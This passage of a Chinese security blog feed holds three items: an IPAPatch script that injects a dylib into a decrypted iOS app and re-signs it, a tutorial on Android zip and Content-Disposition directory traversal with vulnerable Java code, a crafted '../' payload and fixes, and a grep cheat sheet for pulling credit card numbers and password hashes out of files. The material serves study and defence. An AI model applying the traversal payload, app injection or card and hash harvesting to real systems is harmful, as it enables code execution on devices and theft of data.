class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"># ---------------------------------------------------</span><br><span class="line"># 0. Prepare Working Enviroment</span><br><span class="line"></span><br><span class="line">rm -rf &quot;$TEMP_PATH&quot; || true</span><br><span class="line">mkdir -p &quot;$TEMP_PATH&quot; || true</span><br><span class="line"></span><br><span class="line">DUMMY_DISPLAY_NAME=$(/usr/libexec/PlistBuddy -c &quot;Print CFBundleDisplayName&quot;  &quot;$&#123;SRCROOT&#125;/$TARGET_NAME/Info.plist&quot;)</span><br><span class="line">echo &quot;DUMMY_DISPLAY_NAME: $DUMMY_DISPLAY_NAME&quot;</span><br><span class="line"></span><br><span class="line">TARGET_BUNDLE_ID=&quot;$PRODUCT_BUNDLE_IDENTIFIER&quot;</span><br><span class="line">echo &quot;TARGET_BUNDLE_ID: $TARGET_BUNDLE_ID&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 1. Extract Target IPA</span><br><span class="line"></span><br><span class="line">unzip -oqq &quot;$TARGET_IPA_PATH&quot; -d &quot;$TEMP_PATH&quot;</span><br><span class="line">TEMP_APP_PATH=$(set -- &quot;$TEMP_PATH/Payload/&quot;*.app; echo &quot;$1&quot;)</span><br><span class="line">echo &quot;TEMP_APP_PATH: $TEMP_APP_PATH&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 2. Overwrite DummyApp IPA with Target App Contents</span><br><span class="line"></span><br><span class="line">TARGET_APP_PATH=&quot;$BUILT_PRODUCTS_DIR/$TARGET_NAME.app&quot;</span><br><span class="line">echo &quot;TARGET_APP_PATH: $TARGET_APP_PATH&quot;</span><br><span class="line"></span><br><span class="line">rm -rf &quot;$TARGET_APP_PATH&quot; || true</span><br><span class="line">mkdir -p &quot;$TARGET_APP_PATH&quot; || true</span><br><span class="line">cp -rf &quot;$TEMP_APP_PATH/&quot; &quot;$TARGET_APP_PATH/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 3. Inject the Executable We Wrote and Built (IPAPatch.framework)</span><br><span class="line"></span><br><span class="line">APP_BINARY=`plutil -convert xml1 -o - $TARGET_APP_PATH/Info.plist|grep -A1 Exec|tail -n1|cut -f2 -d\&gt;|cut -f1 -d\&lt;`</span><br><span class="line">OPTOOL=&quot;$&#123;SRCROOT&#125;/Tools/optool&quot;</span><br><span class="line"></span><br><span class="line">mkdir &quot;$TARGET_APP_PATH/Dylibs&quot;</span><br><span class="line">cp &quot;$BUILT_PRODUCTS_DIR/IPAPatch.framework/IPAPatch&quot; &quot;$TARGET_APP_PATH/Dylibs/IPAPatch&quot;</span><br><span class="line">for file in `ls -1 $TARGET_APP_PATH/Dylibs`; do</span><br><span class="line">    echo -n &apos;     &apos;</span><br><span class="line">    echo &quot;Install Load: $file -&gt; @executable_path/Dylibs/$file&quot;</span><br><span class="line">    $OPTOOL install -c load -p &quot;@executable_path/Dylibs/$file&quot; -t $TARGET_APP_PATH/$APP_BINARY &gt;&amp; /dev/null</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">chmod +x &quot;$TARGET_APP_PATH/$APP_BINARY&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 4. Inject External Frameworks if Exists</span><br><span class="line"></span><br><span class="line">TARGET_APP_FRAMEWORKS_PATH=&quot;$BUILT_PRODUCTS_DIR/$TARGET_NAME.app/Frameworks&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;Injecting Frameworks from $FRAMEWORKS_TO_INJECT_PATH&quot;</span><br><span class="line">for file in `ls -1 $&#123;FRAMEWORKS_TO_INJECT_PATH&#125;`; do</span><br><span class="line">    extension=&quot;$&#123;file##*.&#125;&quot;</span><br><span class="line">    echo &quot;$file &apos;s extension is $extension&quot;</span><br><span class="line"></span><br><span class="line">    if [ &quot;$extension&quot; != &quot;framework&quot; ]</span><br><span class="line">    then</span><br><span class="line">        continue</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    filename=&quot;$&#123;file%.*&#125;&quot;</span><br><span class="line"></span><br><span class="line">    cp &quot;$FRAMEWORKS_TO_INJECT_PATH/$file/$filename&quot; &quot;$TARGET_APP_PATH/Dylibs/$filename&quot;</span><br><span class="line"></span><br><span class="line">    echo -n &apos;     &apos;</span><br><span class="line">    echo &quot;Install Load: $file -&gt; @executable_path/Dylibs/$filename&quot;</span><br><span class="line">    $OPTOOL install -c load -p &quot;@executable_path/Dylibs/$filename&quot; -t $TARGET_APP_PATH/$APP_BINARY &gt;&amp; /dev/null</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 5. Remove Plugins (AppExtensions), To Simplify the Signing Process</span><br><span class="line"></span><br><span class="line">rm -rf &quot;$TARGET_APP_PATH/PlugIns&quot; || true</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 7. Update Info.plist for Target App</span><br><span class="line"></span><br><span class="line">TARGET_DISPLAY_NAME=$(/usr/libexec/PlistBuddy -c &quot;Print CFBundleDisplayName&quot;  &quot;$TARGET_APP_PATH/Info.plist&quot;)</span><br><span class="line">TARGET_DISPLAY_NAME=&quot;$DUMMY_DISPLAY_NAME$TARGET_DISPLAY_NAME&quot;</span><br><span class="line"></span><br><span class="line">/usr/libexec/PlistBuddy -c &quot;Set :CFBundleIdentifier $PRODUCT_BUNDLE_IDENTIFIER&quot; &quot;$TARGET_APP_PATH/Info.plist&quot;</span><br><span class="line">/usr/libexec/PlistBuddy -c &quot;Set :CFBundleDisplayName $TARGET_DISPLAY_NAME&quot; &quot;$TARGET_APP_PATH/Info.plist&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 8. Code Sign All The Things</span><br><span class="line"></span><br><span class="line">for DYLIB in &quot;$TARGET_APP_PATH/Dylibs/&quot;*</span><br><span class="line">do</span><br><span class="line">    FILENAME=$(basename $DYLIB)</span><br><span class="line">    /usr/bin/codesign --force --sign &quot;$EXPANDED_CODE_SIGN_IDENTITY&quot; &quot;$DYLIB&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ -d &quot;$TARGET_APP_FRAMEWORKS_PATH&quot; ]; then</span><br><span class="line">for FRAMEWORK in &quot;$TARGET_APP_FRAMEWORKS_PATH/&quot;*</span><br><span class="line">do</span><br><span class="line">    FILENAME=$(basename $FRAMEWORK)</span><br><span class="line">    /usr/bin/codesign --force --sign &quot;$EXPANDED_CODE_SIGN_IDENTITY&quot; &quot;$FRAMEWORK&quot;</span><br><span class="line">done</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">/usr/bin/codesign --force --sign &quot;$EXPANDED_CODE_SIGN_IDENTITY&quot; --timestamp=none &quot;$TARGET_APP_PATH/$APP_BINARY&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------</span><br><span class="line"># 9. Install</span><br><span class="line">#</span><br><span class="line">#    Nothing To Do, Xcode Will Automatically Install the DummyApp We Overwrited</span><br></pre></td></tr></table></figure></p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol><li><p>Clone或下载IPAPatch项目到本地</p></li><li><p>准备砸过壳的IPA文件<br>可以在 <a href="http://www.iphonecake.com" target="_blank" rel="noopener">http://www.iphonecake.com</a> 上找<br>The IPA file you use need to be decrypted, you can get </p></li><li>替换项目中的IPA<br>将IPAPatch/Assets/app.ipa替换为自己的ipa,名字必须为app.ipa</li><li>准备External Frameworks (非必须)<br>目录在IPAPatch/Assets/Frameworks. Frameworks会自动链接<br>例如：IPAPatch/Assets/Frameworks/RevealServer.framework<br>下图是通过 Reveal，拿到需要集成的 Framework 文件<br><img src="/images/pasted-33.png" alt="upload successful"><br>将 RevealServer.framework 放置在 Assets/Frameworks/RevealServer.framework<br><img src="/images/pasted-34.png" alt="upload successful"></li><li>配置Build Settings<br>使用xcode打开IPAPatch.xcodeproj,在Project Editor中选择IPAPatch-DummyApp，默认名称为”💊”, 可以自由修改。<br>修改Bundle Identifier，并配置codesing<br><img src="/images/pasted-35.png" alt="upload successful"></li><li>编译运行<br>编译后点击手机上的图标运行app,会提示证书问题，去设置-通用-设备管理中信任证书即可。</li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android中的目录穿越漏洞</title>
      <link href="/2018/03/30/zip%E8%A7%A3%E5%8E%8B%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/03/30/zip%E8%A7%A3%E5%8E%8B%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在Linux/Unix系统中“..”代表的是向上级目录跳转，如果程序在处理到诸如用“../../../../../../../../../../../etc/hosts”表示的文件时没有进行防护，则会跳转出当前工作目录，跳转到到其他目录中,即目录穿越。</p><p>在 Android 中由于目录穿越造成任意文件写入的漏洞较为常见。首先是写文件的接口可能本身设计上就允许传入任意路径的参数，另一种情况就是直接拼接路径导致可以 “…/” 进行目录穿越。</p><p>由于存在目录穿越漏洞的代码执行者通常是应用本身（非webview沙箱进程），因此一旦存在任意文件写入漏洞，就有可能覆盖原有的文件。此时若应用中存在动态加载代码的逻辑，配合目录穿越则有可能实现任意代码执行。</p><p><strong>add</strong>:<br>后来又多个团队或研究人员研究目录穿越问题，并起来各式各样的名字，现留下链接以备参考：</p><ol><li>zip-slip总结了多个存在目录穿越的第三方语言或库，并包含了具体的代码实例  <a href="https://github.com/snyk/zip-slip-vulnerability" target="_blank" rel="noopener">https://github.com/snyk/zip-slip-vulnerability</a><br><a href="https://snyk.io/research/zip-slip-vulnerability" target="_blank" rel="noopener">https://snyk.io/research/zip-slip-vulnerability</a></li><li>zipperdown iOS平台下多个APP存在目录穿越漏洞</li></ol><h2 id="目录穿越场景"><a href="#目录穿越场景" class="headerlink" title="目录穿越场景"></a>目录穿越场景</h2><h3 id="1-下载文件到指定的路径"><a href="#1-下载文件到指定的路径" class="headerlink" title="1. 下载文件到指定的路径"></a>1. 下载文件到指定的路径</h3><p>该场景适用于下载路径由用户可控，例如一些下载工具、保存的目录为用户名等特殊情况。</p><h3 id="2-解压-zip-文件时未对-ZipEntry-文件名检查"><a href="#2-解压-zip-文件时未对-ZipEntry-文件名检查" class="headerlink" title="2. 解压 zip 文件时未对 ZipEntry 文件名检查"></a>2. 解压 zip 文件时未对 ZipEntry 文件名检查</h3><p>Android应用中通常会直接下载一些皮肤等资源文件，为了节约流量，一些资源文件通常打包成zip。</p><p>Java代码在解压ZIP文件时会使用到ZipEntry类的getName()方法。如果ZIP文件中包含“../”的字符串，该方法返回值里面会原样返回。如果在这里没有进行防护，继续解压缩操作，就会将解压文件创建到其他目录中。</p><p>漏洞代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public void UnZipFolder(String zipFileString, String outPathString) throws Exception &#123;</span><br><span class="line">        //ZipInputStream inZip = new ZipInputStream(new FileInputStream(zipFileString));</span><br><span class="line">        ZipInputStream inZip = new ZipInputStream(getAssets().open(&quot;a.zip&quot;));</span><br><span class="line">        ZipEntry zipEntry;</span><br><span class="line">        String szName = &quot;&quot;;</span><br><span class="line">        while ((zipEntry = inZip.getNextEntry()) != null) &#123;</span><br><span class="line">        //调用zipEntry的getName方法没有检查是否包含&quot;../&quot;</span><br><span class="line">            szName = zipEntry.getName();</span><br><span class="line">            if (zipEntry.isDirectory()) &#123;</span><br><span class="line">                // get the folder name of the widget</span><br><span class="line">                szName = szName.substring(0, szName.length() - 1);</span><br><span class="line">                File folder = new File(outPathString + File.separator + szName);</span><br><span class="line">                folder.mkdirs();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line"></span><br><span class="line">                File file = new File(outPathString + File.separator + szName);</span><br><span class="line">                file.createNewFile();</span><br><span class="line">                // get the output stream of the file</span><br><span class="line">                FileOutputStream out = new FileOutputStream(file);</span><br><span class="line">                int len;</span><br><span class="line">                byte[] buffer = new byte[1024];</span><br><span class="line">                // read (len) bytes into buffer</span><br><span class="line">                while ((len = inZip.read(buffer)) != -1) &#123;</span><br><span class="line">                    // write (len) byte from buffer at the position 0</span><br><span class="line">                    out.write(buffer, 0, len);</span><br><span class="line">                    out.flush();</span><br><span class="line">                &#125;</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        inZip.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>此时，构造一个zip文件，其中某一个文件的名字为“../../../../../../sdcard/exec.so”,调用上述代码时就会触发漏洞。</p><p>在主流操作系统中，文件名是不允许包含“/”的，那么也就无法通过直接压缩的方式构造zip包了。那么如何构造一个包含“../”的zip文件？</p><p><strong>可以先计算含“../”的文件名长度，例如“../../../../../../sdcard/exec.so”长度为32,我们先创建一个文件“aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.so”,之后压缩成为zip，然后再用010editor找到对应字段直接修改即可。</strong></p><p><img src="/images/pasted-32.png" alt="upload successful"></p><h3 id="3-下载时未对-Content-Disposition进行合法性检查"><a href="#3-下载时未对-Content-Disposition进行合法性检查" class="headerlink" title="3. 下载时未对 Content-Disposition进行合法性检查"></a>3. 下载时未对 Content-Disposition进行合法性检查</h3><p>Content-Disposition 是常见的 HTTP 协议 header，在文件下载时可以告诉客户端浏览器下载的文件名。例如服务器返回 Content-Disposition: attachment; filename=”my.html” ，浏览器将弹出另存为对话框（或直接保存），默认的文件名就是 my.html。</p><p>但这个 filename 参数显然是不可信任的。例如恶意网站返回的文件名包含 ../，当 Android 应用尝试将这个文件保存到 /sdcard/Downloads 时，攻击者就有机会把文件写入到 /data/ 目录中了：</p><p>例如如下的代码逻辑：</p><p>服务端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-Disposition: attachment;filename=../../../../../../../../sdcard/hack.php&apos;);</span><br><span class="line">echo &quot;hello,m4bln&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>客户端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public void downloadFiles(String urlStr)&#123;</span><br><span class="line">        FileOutputStream output;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            URL url=new URL(urlStr);</span><br><span class="line">            //创建一个HTTP链接</span><br><span class="line">            HttpURLConnection urlConn=(HttpURLConnection)url.openConnection();</span><br><span class="line">            urlConn.connect();</span><br><span class="line"></span><br><span class="line">            //根据header中的Content-Disposition 获取文件名</span><br><span class="line">            String fileName = urlConn.getHeaderField(&quot;Content-Disposition&quot;);</span><br><span class="line">            fileName = URLDecoder.decode(fileName.substring(fileName.indexOf(&quot;filename&quot;)+10,fileName.length()-1),&quot;UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">            InputStream inputStream=urlConn.getInputStream();</span><br><span class="line"></span><br><span class="line">            File file=new File(getApplicationContext().getFilesDir().toString()+&quot;/&quot;+fileName);</span><br><span class="line"></span><br><span class="line">            output=new FileOutputStream(file);</span><br><span class="line">            byte buffer[]=new byte[4*1024];//每次存4K</span><br><span class="line">            int temp;</span><br><span class="line">            //写入数据</span><br><span class="line">            while((temp=inputStream.read(buffer))!=-1)&#123;</span><br><span class="line">                output.write(buffer,0,temp);</span><br><span class="line">            &#125;</span><br><span class="line">            output.flush();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;读写数据异常:&quot;+e);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><strong>注： 当使用默认浏览器下载时，浏览器会把“../”替换为”.._”</strong><br><img src="/images/pasted-31.png" alt="upload successful"></p><h2 id="几种常见的-Android-下动态加载可执行代码"><a href="#几种常见的-Android-下动态加载可执行代码" class="headerlink" title="几种常见的 Android 下动态加载可执行代码"></a>几种常见的 Android 下动态加载可执行代码</h2><p>如果应用动态加载代码之前未做签名校验，利用目录穿越漏洞进行覆盖，可实现稳定的任意代码执行。此外由于在文件系统中写入了可执行文件，还可以实现持久化攻击的效果。</p><ol><li>DexClassLoader 动态载入应用可写入的 dex 可执行文件</li><li>java.lang.Runtime.exec 方法执行应用可写入的 elf 文件</li><li>System.load 和 System.loadLibrary 动态载入应用可写入的 elf 共享对象</li><li>本地代码使用 system、popen 等类似函数执行应用可写入的 elf 文件</li><li>本地代码使用 dlopen 载入应用可写入的 elf 共享对象</li><li>利用 Multidex 机制：<a href="https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/" target="_blank" rel="noopener">A Pattern for Remote Code Execution using Arbitrary File Writes and MultiDex Applications</a></li></ol><p>关于动态加载需要注意以下几点：</p><p><strong>1. 在Android中，System.loadLibrary()是从应用的lib目录中加载.so文件，而System.load()是用某个.so文件的绝对路径加载，这个.so文件可以不在应用的lib目录中，可以在SD卡中，或者在应用的files目录中，只要应用有读的权限目录中即可。</strong><br><strong>2. 在files目录中，应用具有写入权限，利用ZIP文件目录遍历漏洞可以替换掉原先的so文件，达到远程命令执行的目的。而应用的lib目录是软链接到了/data/app-lib/应用目录，属于system用户，第三方应用在执行时没有写入/data/app-lib目录的权限</strong></p><h2 id="常见的修复方法"><a href="#常见的修复方法" class="headerlink" title="常见的修复方法"></a>常见的修复方法</h2><ol><li>对重要的ZIP压缩包文件进行数字签名校验，校验通过才进行解压。</li><li>检查Zip压缩包中使用ZipEntry.getName()获取的文件名中是否包含”../”或者”..”<br> 检查”../”的时候不必进行URI Decode（以防通过URI编码”..%2F”来进行绕过），测试发现ZipEntry.getName()对于Zip包中有“..%2F”的文件路径不会进行处理。</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://jaq.alibaba.com/community/art/show?articleid=383" target="_blank" rel="noopener">https://jaq.alibaba.com/community/art/show?articleid=383</a></li><li><a href="https://zhuanlan.zhihu.com/p/28107901" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28107901</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>常用的正则、搜索</title>
      <link href="/2018/03/22/%E5%B8%B8%E7%94%A8%E7%9A%84%E6%AD%A3%E5%88%99%E3%80%81%E6%90%9C%E7%B4%A2/"/>
      <url>/2018/03/22/%E5%B8%B8%E7%94%A8%E7%9A%84%E6%AD%A3%E5%88%99%E3%80%81%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<p>转自：<a href="https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers" target="_blank" rel="noopener">https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers</a></p><h1 id="提取E-mail"><a href="#提取E-mail" class="headerlink" title="提取E-mail"></a>提取E-mail</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E -o &quot;\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b&quot; *.txt &gt; e-mails.txt</span><br></pre></td></tr></table></figure><h1 id="提取http-url"><a href="#提取http-url" class="headerlink" title="提取http url"></a>提取http url</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep http | grep -shoP &apos;http.*?[&quot; &gt;]&apos; *.txt &gt; http-urls.txt</span><br></pre></td></tr></table></figure><p>For extracting HTTPS, FTP and other URL format use<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E &apos;(((https|ftp|gopher)|mailto)[.:][^ &gt;&quot;]*|www.[-a-z0-9.]+)[^ .,;&gt;&quot;&gt;):]&apos; *.txt &gt; urls.txt</span><br></pre></td></tr></table></figure></p><h1 id="提取浮点数"><a href="#提取浮点数" class="headerlink" title="提取浮点数"></a>提取浮点数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E -o &quot;^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$&quot; *.txt &gt; floats.txt</span><br></pre></td></tr></table></figure><h1 id="提取信用卡号码"><a href="#提取信用卡号码" class="headerlink" title="提取信用卡号码"></a>提取信用卡号码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Visa </span><br><span class="line"># grep -E -o &quot;4[0-9]&#123;3&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;&quot; *.txt &gt; visa.txt</span><br><span class="line"></span><br><span class="line">MasterCard </span><br><span class="line"># grep -E -o &quot;5[0-9]&#123;3&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;&quot; *.txt &gt; mastercard.txt</span><br><span class="line"></span><br><span class="line">American Express </span><br><span class="line"># grep -E -o &quot;\b3[47][0-9]&#123;13&#125;\b&quot; *.txt &gt; american-express.txt</span><br><span class="line"></span><br><span class="line">Diners Club </span><br><span class="line"># grep -E -o &quot;\b3(?:0[0-5]|[68][0-9])[0-9]&#123;11&#125;\b&quot; *.txt &gt; diners.txt</span><br><span class="line"></span><br><span class="line">Discover </span><br><span class="line"># grep -E -o &quot;6011[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;&quot; *.txt &gt; discover.txt</span><br><span class="line"></span><br><span class="line">JCB </span><br><span class="line"># grep -E -o &quot;\b(?:2131|1800|35d&#123;3&#125;)d&#123;11&#125;\b&quot; *.txt &gt; jcb.txt</span><br><span class="line"></span><br><span class="line">AMEX </span><br><span class="line"># grep -E -o &quot;3[47][0-9]&#123;2&#125;[ -]?[0-9]&#123;6&#125;[ -]?[0-9]&#123;5&#125;&quot; *.txt &gt; amex.txt</span><br></pre></td></tr></table></figure><h1 id="各种hash的提取"><a href="#各种hash的提取" class="headerlink" title="各种hash的提取"></a>各种hash的提取</h1><h2 id="md5-hash"><a href="#md5-hash" class="headerlink" title="md5 hash"></a>md5 hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -oE &apos;(^|[^a-fA-F0-9])[a-fA-F0-9]&#123;32&#125;([^a-fA-F0-9]|$)&apos; *.txt | egrep -o &apos;[a-fA-F0-9]&#123;32&#125;&apos; &gt; md5-hashes.txt</span><br></pre></td></tr></table></figure><p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -rn &apos;s/.*[^a-fA-F0-9]([a-fA-F0-9]&#123;32&#125;)[^a-fA-F0-9].*/1/p&apos; *.txt &gt; md5-hashes</span><br></pre></td></tr></table></figure></p><p>上述代码用来查找SHA1, SHA256等其他未加salt的hash, 对于其他长度hash,只需要更改{32}中的长度</p><h2 id="Extract-valid-MySQL-Old-hashes"><a href="#Extract-valid-MySQL-Old-hashes" class="headerlink" title="Extract valid MySQL-Old hashes"></a>Extract valid MySQL-Old hashes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e &quot;[0-7][0-9a-f]&#123;7&#125;[0-7][0-9a-f]&#123;7&#125;&quot; *.txt &gt; mysql-old-hashes.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-blowfish-hashes"><a href="#Extract-blowfish-hashes" class="headerlink" title="Extract blowfish hashes"></a>Extract blowfish hashes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e &quot;$2a\$8\$(.)&#123;75&#125;&quot; *.txt &gt; blowfish-hashes.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-Joomla-hashes"><a href="#Extract-Joomla-hashes" class="headerlink" title="Extract Joomla hashes"></a>Extract Joomla hashes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &quot;([0-9a-zA-Z]&#123;32&#125;):(w&#123;16,32&#125;)&quot; *.txt &gt; joomla.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-VBulletin-hashes"><a href="#Extract-VBulletin-hashes" class="headerlink" title="Extract VBulletin hashes"></a>Extract VBulletin hashes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &quot;([0-9a-zA-Z]&#123;32&#125;):(S&#123;3,32&#125;)&quot; *.txt &gt; vbulletin.txt</span><br></pre></td></tr></table></figure><h2 id="Extraxt-phpBB3-MD5"><a href="#Extraxt-phpBB3-MD5" class="headerlink" title="Extraxt phpBB3-MD5"></a>Extraxt phpBB3-MD5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &apos;$H$S&#123;31&#125;&apos; *.txt &gt; phpBB3-md5.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-Wordpress-MD5"><a href="#Extract-Wordpress-MD5" class="headerlink" title="Extract 